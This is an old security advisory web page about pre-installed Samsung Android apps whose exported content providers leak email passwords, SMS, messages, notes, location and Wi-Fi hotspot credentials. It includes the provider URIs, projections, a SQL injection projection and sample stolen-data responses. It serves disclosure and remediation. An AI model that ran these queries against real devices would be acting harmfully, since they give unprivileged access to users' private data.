<!DOCTYPE html>
<html lang="en-US">
<head>
    <base href="https://labs.f-secure.com/"><!--[if lte IE 6]></base><![endif]-->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<meta name="x-subsite-id" content="1" />

    <title>Multiple Samsung (Android) Application Vulnerabilities</title>

    <link rel="stylesheet" href="https://labs.f-secure.com/themes/mwr/css/style.css?t=20200715">
    <link rel="stylesheet" href="https://labs.f-secure.com/themes/labs/css/style.css?t=20200715">

    <meta name="description" content="">
    <link rel="canonical" href="https://labs.f-secure.com/advisories/multiple-samsung-android-application-vulnerabilities/">
    <meta name="robots" content="NOODP,index,follow">

    

    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">

    <meta name="format-detection" content="telephone=no">
    
    <meta property="og:title" content="">
    <meta property="og:description" content="">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="F-Secure Labs">
    <meta property="og:url" content="https://labs.f-secure.com/advisories/multiple-samsung-android-application-vulnerabilities/">
    
    <meta property="og:locale" content='en_GB'>
    <meta name="twitter:card" content="summary">
    
    <meta name="twitter:title" content="">
    <meta name="twitter:description" content="">

  <script>
    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});
    var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;
    j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})
    (window,document,'script','dataLayer','GTM-KD9T85H');
  </script>
  <meta name="google-site-verification" content="jqRTM8I_uI-jDIu1ITng14jD-3iJy0l3TTCIl2I-BIo" />
<link rel="stylesheet" type="text/css" href="/themes/labs/css/style.css?m=1600760392" />
</head>
<body class="BlogPost" dir="ltr">

    <header class="head menu-opened" id="top">
	<div class="container">
		<div class="col12">
			<div class="logo">
				<a href="/">F-Secure</a>
			</div>
		    <a href="/advisories/multiple-samsung-android-application-vulnerabilities/#nav" class="btn-menu">Menu</a>

<nav class="main-nav" itemscope itemtype="https://schema.org/SiteNavigationElement">
    <ul>
        
            <li class="section nav-advisories"><a href="/advisories/" title="Advisories">Advisories</a></li>
        
            <li class="link nav-blog"><a href="/blog/" title="/var/log/messages">/var/log/messages</a></li>
        
            <li class="link nav-publications"><a href="/publications/" title="Publications">Publications</a></li>
        
            <li class="link nav-tools"><a href="/tools/" title="Tools">Tools</a></li>
        
            <li class="link nav-archive"><a href="/archive/" title="Archive">Archive</a></li>
        
        <li class="nav-careers"><a href="https://www.f-secure.com/en/web/about_global/careers/job-openings">Careers</a></li>
    </ul>
</nav>

		</div>
	</div>
</header>


    <div class="wrapper">

        <section class="section">
  <div class="page-title">
    <div class="container">
      <span class="content-type"></span>
      <h1>Multiple Samsung (Android) Application Vulnerabilities</h1>
      
      
    </div>
  </div>
</section>

<section class="section">
  <div class="container">
    <div class="col8">
      <div class="blog-post">
        
        <table>
          <tr>
            <td>Product</td>
            <td>Multiple pre-installed Samsung applications</td>
          </tr>
          <tr>
            <td>Severity</td>
            <td>High</td>
          </tr>
          <tr>
            <td>CVE Reference</td>
            <td>N/A</td>
          </tr>
          <tr>
            <td>Type</td>
            <td> Multiple Samsung (Android) Application Vulnerabilities</td>
          </tr>
        </table>
        
        <p>Many Samsung applications are pre-installed by default on Samsung Android devices and these applications cannot be removed by the user. Some of these applications make use of content providers which are implicitly exported by default. This results in these content providers allowing other applications on the device to request sensitive information and successfully obtain it. This is cause for concern as any 3rd party application containing malicious code does not require any granted permissions in order to obtain sensitive information from these applications. It should be noted that only applications disclosing potentially sensitive information are being reported on in this document.</p>
<dl><dt>Package Name</dt><dd>Multiple pre-installed Samsung applications</dd><dt>Date</dt><dd>2011-12-13</dd><dt>Affected Versions</dt><dd>Samsung Galaxy S2 (I9100XWKI4) – Android 2.3.4<br>Other models running these applications may be affected</dd><dt><span class="caps">CVE</span> Reference</dt><dd>None</dd><dt>Authors</dt><dd>Tyrone Erasmus<br>Mike Auty (Channels SQLi)</dd><dt>Severity</dt><dd>High Risk</dd><dt>Local/Remote</dt><dd>Local</dd><dt>Vulnerability Class</dt><dd>Android Content Providers</dd><dt>Vendor</dt><dd>Samsung</dd><dt>Vendor Response</dt><dd>Vendor updated all vulnerable software and firmware releases after 13th March 2012 contain the fixes.</dd></dl><h3>Description</h3>
<p>The following applications allow the retrieval of sensitive information from their content providers without any granted permissions:</p>
<table><tbody><tr><td>Package</td>
<td>Obtainable Information</td>
<td>Version</td>
</tr><tr><td>com.seven.z7<br>(Social Hub)</td>
<td>Email address and password<br>Email contents<br>Instant messages</td>
<td>7.52.10101</td>
</tr><tr><td>com.sec.android.socialhub<br>(Social Hub)</td>
<td>Social networking messages</td>
<td>2.00.00001</td>
</tr><tr><td>com.sec.android.im (IM)</td>
<td>Instant messages</td>
<td>1.00.10201</td>
</tr><tr><td>com.android.providers.telephony (Dialer Storage)</td>
<td><span class="caps">SMS</span></td>
<td>2.3.4</td>
</tr><tr><td>com.sec.android.provider.logsprovider (LogsProvider)</td>
<td><span class="caps">SMS</span><br>Email contents<br>Instant messages<br>Social networking messages</td>
<td>1.0</td>
</tr><tr><td>com.sec.android.widgetapp.weatherclock<br>(AccuWeather.com)</td>
<td>Location</td>
<td>11.06.27.01</td>
</tr><tr><td>com.sec.android.app.minidiary Notes<br>(MiniDiary)</td>
<td>Photos<br>Photo locations</td>
<td>1.0</td>
</tr><tr><td>com.sec.android.app.memo<br>(Memo)</td>
<td>Notes</td>
<td>1.0</td>
</tr><tr><td>com.sec.android.widgetapp.postit<br>(Minipaper)</td>
<td>Notes</td>
<td>1.0</td>
</tr><tr><td>com.osp.app.signin<br>(Samsung Account)</td>
<td>Encrypted account information</td>
<td>1.0</td>
</tr></tbody></table><h3>Impact</h3>
<p>Malicious applications installed on the same device as the vulnerable applications could steal sensitive information from the user and transmit it back to the attacker.</p>
<h3>Cause</h3>
<p>These vulnerabilities are present because insufficient security permissions are set on the content provider section in each of the vulnerable application’s AndroidManifest.xml file.</p>
<h3>Interim Workaround</h3>
<p>Avoid using the vulnerable applications if you do not have access to the firmware update. To clear informationstored in these applications go to Settings→Applications→Manage Applications and press “Clear data”.</p>
<p><img src="system/assets/293/original/clear-data.png" alt="clear-data" title=""></p>
<h3>Solution</h3>
<p>In the AndroidManifest.xml file of each application that contains a content provider, it was recommended that read and write permissions are set. An example is shown below:</p>
<pre>&lt;provider android:name=".db.Provider” android:authorities="com.example.app" 
  android:readPermission="com.example.app.provider.permission.READ" 
  android:writePermission="com.example.app.provider.permission.WRITE" /&gt;</pre>
<p>This means that an application wanting to read or write to this content provider needs to have the stated<br> permissions in order to do so.</p>
<h3>Technical Description</h3>
<p>The following section will be organised by the information that is obtainable by an unprivileged application. Thepremise of this section is that an application with no granted permissions can perform a query on the specified content providers in order to obtain the targeted information.</p>
<p>When querying a content provider, methods are provided that allows the developer to construct <span class="caps">SQL</span> statements. The following is what the query method in Android looks like to a developer:</p>
<pre>query(uri, projection, selection, selectionArgs, sortOrder)</pre>
<p>These parameters get used at various points in a <span class="caps">SQL</span> statement to construct the query. This also means that there is often <span class="caps">SQL</span> injection vulnerabilities present in these fields on content providers.</p>
<h4>Email</h4>
<h5>com.seven.z7 (Social Hub)</h5>
<p>Registered user accounts within Social Hub and their associated service.</p>
<pre>Uri: content://com.seven.provider.email/accounts
Projection: user_name, provision_name
Response:
user_name | provision_name
testaccount@yahoo.com | Yahoo! Messenger
testaccount@yahoo.com | Yahoo! Mail</pre>
<h5>com.seven.z7 (Social Hub)</h5>
<p>The password for instant messaging accounts within Social Hub. This password is often the same for the email account and IM account on services like Yahoo and Google.</p>
<pre>Uri: content://com.seven.provider.email/dbprefs
Response:
_id | category | type | key | value | flags
...
242 | Account-6 | 5 | Z7_IM_CLIENT_SETTING_PASSWORD_STRING | Password123 | 0
...</pre>
<h5>com.seven.z7 (Social Hub)</h5>
<p>Email messages.</p>
<pre>Uri: content://com.seven.provider.email/emails
Projection: _id, _from, subject, body
Response:
_id | _from | subject | body
...
30 | friend@yahoo.com | Test subject | Email contents
...</pre>
<h5>com.sec.android.provider.logsprovider (LogsProvider)</h5>
<p>Email messages.</p>
<pre>Uri: content://logs/email_seven
Projection: messageid, address, m_subject, m_content
Response:
messageid | address | m_subject | m_content
...
30 | friend@yahoo.com | Test subject | Email contents
...</pre>
<p>All email accounts registered in Social Hub have their email contents logged. This query to the logs content provider shows the same data as com.seven.provider.email provider except that even if the account gets deregistered or removed from Social Hub, the logs still persist.</p>
<h4>Instant Messages</h4>
<h5>com.seven.z7 (Social Hub)</h5>
<p>Get all contacts.</p>
<pre>Uri: content://com.seven.provider.im/contacts
Projection: contact
Response:
John
Paul
Susan</pre>
<h5>com.seven.z7 (Social Hub)</h5>
<p>Get instant messages from Social Hub.</p>
<pre>Uri: content://com.seven.provider.im/messages
Projection: _id, contact, account, body
Response:
_id | contact | account | body
...
14 | John | 6 | Hi, how are you?
...</pre>
<h5>com.sec.android.provider.logsprovider (LogsProvider)</h5>
<p>Get the same instant message as above, except from the logs.</p>
<pre>Uri: content://logs/im
Projection: account_id, name, m_content
Response:
account_id | buddy_name | message
...
6 | John | Hi, how are you?
...</pre>
<p>The logs persist even after an IM account has been deregistered.</p>
<h5>com.sec.android.im (IM)</h5>
<p>Get the same instant message as above, except from the IM application itself.</p>
<pre>Uri: content://com.tecace.app.convprovider
Projection: _id, accountId, buddy_name, message
Response:
_id | accountId | buddy_name | message
...
3 | -1 | null | Hi, how are you?
...</pre>
<h4><span class="caps">SMS</span></h4>
<h5>com.android.providers.telephony (Dialer Storage)</h5>
<p>All <span class="caps">SMS</span> messages.</p>
<pre>Uri: content://channels
Projection: * FROM sms;--
Response:
_id | thread_id | address | person | date | protocol | read | status | type | 
reply_path_present | subject | body | service_center | locked | error_code | seen | 
deletable | hidden | group_id | group_type | delivery_date
...
572 | 3 | +27821234567 | null | 1323444871859 | null | 1 | 0 | 2 | null | null | This 
is a message from me to you | null | 0 | 0 | 1 | 1 | 0 | null | null | 1323444881072
...</pre>
<p><span class="caps">SQL</span> injection exists within the projection and selection parameters for the channels content provider.</p>
<h5>com.sec.android.provider.logsprovider (LogsProvider)</h5>
<p>First 50 characters of <span class="caps">SMS</span> messages.</p>
<pre>Uri: content://logs/historys
Projection: number, m_content
Selection: number like '+%'
Response:
number | m_content
...
+27821234567 | This is a message from me to you
...</pre>
<h4>Social Networking Messages</h4>
<h5>com.sec.android.socialhub (Social Hub)</h5>
<p>Messages from Social Networks.</p>
<pre>Uri: content://com.sec.android.socialhub.unifiedinbox/messages
Projection: name,m_subject,m_content
Response:
name | m_subject | m_content
John Smith | Birthday | Are you coming to my party?</pre>
<h4>Notes</h4>
<h5>com.sec.android.app.minidiary (MiniDiary)</h5>
<p>All notes entries, photos and photo locations.</p>
<pre>Uri: content://com.sec.android.providers.minidiary.MiniDiaryData/diary
Projection: _id, location, date, longitude, latitude, picture_file, note
Response:
_id | location | date | longitude | latitude | picture_file | note
1 | Germany, Hesse | 2011.01.11 | 9804903 | 51115599 | /data/data/com.sec.android.app.minidiary/files/picture/1323636867660.jpg | Beautiful!</pre>
<p>It should also be noted that on Android the contents of the SD card are accessible from any application, allowing applications to retrieve them and upload them to an attacker.</p>
<h5>com.sec.android.app.memo (Memo)</h5>
<p>User notes stored in this application.</p>
<pre>Uri: content://com.samsung.sec.android/memo/all
Projection: _id, title, content
Response:
_id | title | content
1 | 20111211 | Note contentsPUBLIC</pre>
<h5>com.sec.android.widgetapp.postit (Minipaper)</h5>
<p>User notes stored in this application.</p>
<pre>Uri: content://com.sec.android.widgetapp.postit/postit
Projection: _id, body
Response:
_id | body
1 | My first postit!</pre>
<h4>Miscellaneous</h4>
<h5>com.sec.android.socialhub (Social Hub)</h5>
<p>Name of the owner of the device.</p>
<pre>Uri: content://com.sec.android.socialhub.unifiedinbox/sns_msg_receiver_map
Projection: receiver_name
Response:
Tyrone Erasmus</pre>
<h5>com.sec.android.widgetapp.weatherclock (AccuWeather.com)</h5>
<p>General location of the owner of the device.</p>
<pre>Uri: content://com.sec.android.widgetapp.weatherclock
Response:
NAME | STATE | LOCATION | MAIN_DISPLAY | SUMMER_TIME | LATITUDE | LONGITUDE | PROVIDER
Pretoria | Gauteng, South Africa | cityId:305449 | 1 | 0 | -25.7315 | 28.21821 | 0PUBLIC</pre>
<h5>com.osp.app.signin (Samsung account)</h5>
<p>Obtain encrypted Samsung account settings.</p>
<pre>Uri: content://com.osp.contentprovider.ospcontentprovider/identity
Response:
Value | Key
&lt;base64_value&gt; | UserID
&lt;base64_value&gt; | EmailID
&lt;base64_value&gt; | Password
&lt;base64_value&gt; | MobileCountryCode 
&lt;base64_value&gt; | AuthToken
&lt;base64_value&gt; | AuthTokenSecret
&lt;base64_value&gt; | BirthDate
&lt;base64_value&gt; | UserDeviceID</pre>
<p>It should be noted that the &lt;base64_value&gt; given above is an encrypted string that has been base64 encoded.</p>
<p>If the mechanism that encrypts and decrypts this data is found to be weak, the user’s Samsung account would be compromised.</p>
<h5>com.android.providers.settings (Settings Storage)</h5>
<p>Portable Wi-Fi hotspot credentials.</p>
<pre>Uri: content://settings/secure
Response:
_id | name | value
2736 | wifi_ap_passwd | h0tsp0tp@ssw0rd
...
2859 | wifi_ap_ssid | Hotspot1234</pre>
      </div>
      <div class="social-share">
        <p><span class="content-type">Share</span></p>
        <ul class="social">
  <li class="facebook"><a href="http://www.facebook.com/sharer.php?u=https://labs.f-secure.com/advisories/multiple-samsung-android-application-vulnerabilities/" target="_blank">Share on Facebook</a></li>
  <li class="twitter"><a href="https://twitter.com/share?url=https://labs.f-secure.com/advisories/multiple-samsung-android-application-vulnerabilities/&text=Multiple Samsung (Android) Application Vulnerabilities" target="_blank">Share on LinkedIn</a></li>
  <li class="linkedin"><a href="http://www.linkedin.com/shareArticle?url=https://labs.f-secure.com/advisories/multiple-samsung-android-application-vulnerabilities/&title=Multiple Samsung (Android) Application Vulnerabilities" target="_blank">Share on Twitter</a></li>
</ul>

      </div>
    </div>
    <div class="col4">
      
      <a href="/assets/303/original/mwri_samsung_vulnerabilities_2011-12-13.pdf" class="flex-container__box">
            <span class="content-type">Download</span>
            
            <h3 class="flex-container__box-title">Download the advisory here.</h3>
            
      </a>
      

      
    </div>
  </section>

  <section class="section">
    <div class="container">
      <div class="col12">
        <p>&nbsp;</p>
      </div>
    </div>
  </section>


    </div>

    <footer class="foot">
	<div class="container">
    <div class="footer-flex-wrap">
     <p class="logo"><img src="https://labs.f-secure.com//themes/labs/img/fs-labs-logo-white.svg" alt="F-Secure" width="180" height="60"></p>
      <ul class="top-menu">
        <li><a href="/advisories/multiple-samsung-android-application-vulnerabilities/#top" class="btn-gototop">Top</a></li>
        
        <li class="link"><a href="https://www.f-secure.com/en/consulting/contact">Contact</a></li>
        
        
      </ul>
   </div>
   <hr/>
    <div class="col5 suf1 foot-about">
      <p>F-Secure provides specialist advice and solutions in all areas of cyber security, from professional and managed services, through to developing commercial and open source security tools.  </p>
    </div>
    <div class="col3">
      <ul class="footer-list no-margin">
        
        <li><a href="/publications/ti-report-lazarus-group-cryptocurrency-vertical/">Threat Intelligence Report: Lazarus Group Campaign Targeting the Cryptocurrency Vertical</a></li>
        
        <li><a href="/publications/the-fake-cisco/">The Fake Cisco</a></li>
        
        <li><a href="/publications/u-booting-securely/">U-Booting securely</a></li>
        
      </ul>
    </div>
    <div class="col3">
     <ul class="footer-list">
      
      <li><a href="/blog/prelude-to-ransomware-systembc/">Prelude to Ransomware: SystemBC</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-3/">Attack Detection Fundamentals 2021: Azure - Lab #3</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-2/">Attack Detection Fundamentals 2021: Azure - Lab #2</a></li>
      
    </ul>
  </div>
</div>
<div class="end">
 <div class="container">
  <hr/>
  <div class="footer-flex-wrap">
   <p class="copyright">Copyright &copy; 2021 F-Secure</p>
    <ul class="social">
      
      <li class="linkedin for-footer"><a href="https://www.linkedin.com/showcase/28493188" target="_blank">Connect with us on LinkedIn</a></li>
      
      
      <li class="twitter for-footer"><a href="https://twitter.com/fsecurelabs" target="_blank">Follow us on Twitter</a></li>
      
      
      <li class="github for-footer"><a href="https://github.com/fsecurelabs" target="_blank">Follow us on GitHub</a></li>
      
    </ul>
 </div>
</div>
</div>
</footer>

    <script src="/themes/mwr/js/min/jquery-3.5.1.min.js" id="jqueryscript"></script>

    
    <script src="/themes/mwr/js/min/slides.min.js"></script>
    

    <script src="/themes/mwr/js/min/scripts.js?20190917" id="pagescripts"></script>

    <script type="application/ld+json">
    { "@context" : "http://schema.org",
      "@type" : "Organization",
      "name" : "F-Secure Labs",
      "url" : "https://labs.f-secure.com",
      "logo" : "https://labs.f-secure.com/themes/labs/img/fs-labs-logo-white.svg",
      "sameAs" : [
          "https://twitter.com/fsecurelabs",
          "https://www.linkedin.com/showcase/28493188"],
      "contactPoint" : [
        { "@type" : "ContactPoint",
          "telephone" : "+441256300920",
          "contactType" : "customer service"
        } ]
    }
    </script>
</body>
</html>
